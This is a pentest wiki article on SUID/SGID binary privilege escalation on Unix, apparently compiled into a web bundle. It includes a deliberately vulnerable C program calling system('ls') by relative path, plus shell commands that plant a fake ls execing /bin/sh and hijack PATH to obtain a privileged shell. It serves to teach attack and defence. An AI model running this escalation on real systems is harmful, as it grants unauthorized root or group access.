import{_ as s,c as a,a5 as e,o as t}from"./chunks/framework.B5CpDqM0.js";const c=JSON.parse('{"title":"SUID/SGID binaries","description":"","frontmatter":{"authors":"ShutdownRepo, dreamkinn, p0dalirius"},"headers":[],"relativePath":"infra/privilege-escalation/unix/suid-sgid-binaries.md","filePath":"infra/privilege-escalation/unix/suid-sgid-binaries.md","lastUpdated":1724982529000}'),n={name:"infra/privilege-escalation/unix/suid-sgid-binaries.md"};function h(l,i,r,p,o,d){return t(),a("div",null,i[0]||(i[0]=[e(`<h1 id="suid-sgid-binaries" tabindex="-1">SUID/SGID binaries <a class="header-anchor" href="#suid-sgid-binaries" aria-label="Permalink to &quot;SUID/SGID binaries&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>On UNIX-like systems, binaries have permissions, just like any other file. Some of them often are over-privileged, sometimes allowing attackers to escalate their privileges on the system. The common permissions are read, write, execute. The extended ones are setuid, setgid, sticky bit, and so on.</p><p>The setuid/setgid (SUID/SGID) bits allows the binary to run with the privileges of the user/group owner instead of those of the user executing it. They can be spotted with the <code>s</code> or <code>S</code> permission in the file user or group owner permissions (i.e. <code>---s--s---</code>). When the file permissions features an uppercase <code>S</code> instead of a lowercase one, it means the corresponding user or group owner doesn&#39;t have execution rights.</p><div class="caution custom-block"><p>Limitations</p><ul><li>Just like capabilities, setuid and setgid bits are unset when a file is copied with <code>cp</code> or when its content changes.</li><li>Some partitions of the UNIX file system can be mounted with the <code>nosuid</code> option. In this case the setuid and setgid bits are ignored for binaries placed inside those partitions. It is a common good practice for tmpfs partitions like <code>/tmp</code> or<code>/run</code>. Searching the <code>/proc/mounts</code> pseudo-file for a <code>nosuid</code> flag can help find these partitions.</li></ul></div><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>All suid or sgid-enabled files the user can have access to can be listed with the following command.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">find</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $starting_path </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-perm</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u=s</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -type</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> f</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> 2&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/dev/null</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Or in octal mode</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">find</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $starting_path </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-perm</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -4000</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -type</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> f</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> 2&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/dev/null</span></span></code></pre></div><p>Vulnerable programs with these permissions are often targeted by attacker to obtain the user (for setuid) or group (for setgid) privileges. There are many techniques that attackers can use to hijack these binaries and obtain the associated rights.</p><h3 id="living-of-the-land" tabindex="-1">Living of the land <a class="header-anchor" href="#living-of-the-land" aria-label="Permalink to &quot;Living of the land&quot;">​</a></h3><p>Using standard binaries features to bypass security restrictions is called Living off the land.</p><p><a href="./living-off-the-land">living-off-the-land.md</a></p><h3 id="relative-path-calls" tabindex="-1">Relative path calls <a class="header-anchor" href="#relative-path-calls" aria-label="Permalink to &quot;Relative path calls&quot;">​</a></h3><p>If a SUID/SGID binary makes calls to programs using relative paths instead of absolute paths, attackers can try to make the binary run a program controlled by the attacker. Let&#39;s take this vulnerable program as an example :</p><div class="language-c vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">c</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">int</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> function</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">int</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;"> argc</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">char</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> *</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">argv</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">[]</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">){</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">/* ... */</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> system</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;ls&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> // instead of system(&quot;/usr/bin/ls&quot;)</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">/* ... */</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span></code></pre></div><p>In the example above, the SUID/SGID binary calls the <code>ls</code> program using a relative path. An attacker can try to create a <code>ls</code> program somewhere he has write access to and edit the <code>PATH</code> environment variable so that his custom program is executed when running the SUID/SGID binary.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/attacker</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/attacker</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &amp;&amp; </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">printf</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;#!/bin/sh\\nexec /bin/sh\\n&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/attacker/ls</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">chmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> +x</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/attacker/ls</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">PATH</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/tmp/attacker:</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$PATH </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">./vuln</span></span></code></pre></div><p>When the <code>vuln</code> program will be executed, the malicious <code>ls</code> program will be called and a shell will be opened.</p><h3 id="binary-exploitation" tabindex="-1">Binary exploitation <a class="header-anchor" href="#binary-exploitation" aria-label="Permalink to &quot;Binary exploitation&quot;">​</a></h3><p>In some cases, the binary that has SUID/SGID permissions can be reverse-engineered and attackers find ways to change the execution flow of that program to make it run something else.</p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/" target="_blank" rel="noreferrer">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</a></p>`,22)]))}const g=s(n,[["render",h]]);export{c as __pageData,g as default};
